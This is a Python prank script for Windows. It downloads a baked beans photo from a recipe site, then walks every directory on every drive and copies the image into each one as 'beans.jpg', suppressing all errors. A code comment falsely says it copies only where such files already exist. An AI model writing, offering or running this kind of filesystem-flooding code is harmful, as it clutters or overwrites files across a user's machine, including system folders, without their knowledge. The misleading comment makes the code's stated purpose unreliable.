import os
import platform
import win32api  # Requires pywin32 module
import requests
import shutil

# Function to download a file from a given URL and save it to the Downloads folder (Windows only)
def download_file(url: str):
    if platform.system() != "Windows":  # Check if the OS is not Windows
        print(f"{platform.system()} not supported.")
        return
    
    # Define the path to the Downloads folder
    downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
    response = requests.get(url, stream=True)
    response.raise_for_status()
    file_name = url.split("/")[-1]

    # Define the full path for the downloaded file in the Downloads folder
    bean_path = os.path.join(downloads_folder, file_name)
    
    # Open the downloaded file and copy its content to the specified path
    with open(bean_path, "wb") as f:
        shutil.copyfileobj(response.raw, f)

    print(f"Success! File saved to {bean_path}")

# Check the detected operating system and display a message
if platform.system() == "Windows":
    release = platform.release()
    if release != "":
        print(f"Windows {release} detected.")
    else:
        print("Windows detected, but release can't be determined.")
elif platform.system() == "Linux":
    release = platform.release()
    print(f"Linux {release} not supported.")
    quit()  # Exit the script if Linux is detected
elif platform.system() == "Darwin":
    release = platform.release()
    print(f"macOS {release} not supported.")
    quit()

# Get a list of available drives on Windows
get_drives = win32api.GetLogicalDriveStrings()
list_of_drives = get_drives.split("\x00")
drive_list = []

for drive in list_of_drives:
    if drive == "":
        pass
    else:
        drive_list.append(drive)

# Download the file using the download_file() function
download_file("https://sweetcsdesigns.com/wp-content/uploads/2021/05/slow-cooker-baked-beans-Recipe-Picture-1.jpg")

# Define the URL and file paths
url = "https://sweetcsdesigns.com/wp-content/uploads/2021/05/slow-cooker-baked-beans-Recipe-Picture-1.jpg"
downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
response = requests.get(url, stream=True)
response.raise_for_status()
file_name = url.split("/")[-1]

bean_path = os.path.join(downloads_folder, file_name)

# Copy the downloaded file to locations on available drives where files are named "beans.jpg"
for drive in drive_list:
    if os.path.isdir(drive):
        for src, dirs, files in os.walk(drive):
            file_path = os.path.join(src, "beans.jpg")
            try:
                shutil.copyfile(bean_path, file_path)
                print(f"Success! {file_path} created")
            except:
                pass
    else:
        pass
